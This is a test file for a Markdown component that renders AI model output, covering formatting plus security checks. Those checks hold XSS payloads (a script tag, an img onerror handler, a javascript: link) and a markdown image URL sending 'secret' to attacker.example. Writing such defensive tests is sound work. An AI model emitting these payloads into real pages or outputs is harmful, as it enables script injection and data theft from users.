import { describe, expect, it } from 'vitest';
import { render, screen } from '@testing-library/react';
import Markdown from '../Markdown';

describe('Markdown', () => {
  it('renders bold without the asterisks', () => {
    const { container } = render(<Markdown>{'Hi **some client**,'}</Markdown>);
    expect(container.querySelector('strong')).toHaveTextContent('some client');
    expect(container.textContent).not.toContain('**');
  });

  it('renders a GFM pipe table as a table', () => {
    const md = [
      '| Item | Details |',
      '|------|---------|',
      '| **Invoice number** | inv-01 |',
      '| Remaining balance | $1,900.00 |',
    ].join('\n');
    const { container } = render(<Markdown>{md}</Markdown>);
    expect(container.querySelector('table')).toBeInTheDocument();
    expect(container.querySelectorAll('th')).toHaveLength(2);
    expect(container.querySelectorAll('td')).toHaveLength(4);
    expect(container.textContent).not.toContain('|');
    expect(container.textContent).not.toContain('---');
  });

  it('wraps tables in a horizontally scrollable container', () => {
    const { container } = render(<Markdown>{'| a | b |\n|---|---|\n| 1 | 2 |'}</Markdown>);
    expect(container.querySelector('table')?.parentElement).toHaveClass('overflow-x-auto');
  });

  it('renders lists, headings, italic and inline code', () => {
    const md = '## Summary\n\n- one\n- two\n\n1. first\n2. second\n\n*soft* and `code`';
    const { container } = render(<Markdown>{md}</Markdown>);
    expect(container.querySelector('h2')).toHaveTextContent('Summary');
    expect(container.querySelectorAll('ul > li')).toHaveLength(2);
    expect(container.querySelectorAll('ol > li')).toHaveLength(2);
    expect(container.querySelector('em')).toHaveTextContent('soft');
    expect(container.querySelector('code')).toHaveTextContent('code');
  });

  it('keeps single line breaks and separate paragraphs', () => {
    const { container } = render(
      <Markdown>{'First paragraph.\n\nBest regards,\nChiranjeev Thomas'}</Markdown>,
    );
    expect(container.querySelectorAll('p')).toHaveLength(2);
    expect(container.querySelector('br')).toBeInTheDocument();
  });

  it('does not render raw HTML', () => {
    const { container } = render(
      <Markdown>{'<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>'}</Markdown>,
    );
    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('img')).toBeNull();
  });

  it('opens safe links in a new tab with noopener noreferrer', () => {
    render(<Markdown>{'[portal](https://example.com)'}</Markdown>);
    const link = screen.getByRole('link', { name: 'portal' });
    expect(link).toHaveAttribute('href', 'https://example.com');
    expect(link).toHaveAttribute('target', '_blank');
    expect(link.getAttribute('rel')).toMatch(/noopener/);
    expect(link.getAttribute('rel')).toMatch(/noreferrer/);
  });

  it('drops javascript: links', () => {
    const { container } = render(<Markdown>{'[click](javascript:alert(1))'}</Markdown>);
    expect(container.querySelector('a[href^="javascript:"]')).toBeNull();
  });

  it('never loads images from model output (shows alt text only)', () => {
    const { container } = render(
      <Markdown>{'See ![invoice chart](https://attacker.example/x.png?d=secret)'}</Markdown>,
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('attacker.example');
    expect(container.textContent).toContain('invoice chart');
  });
});
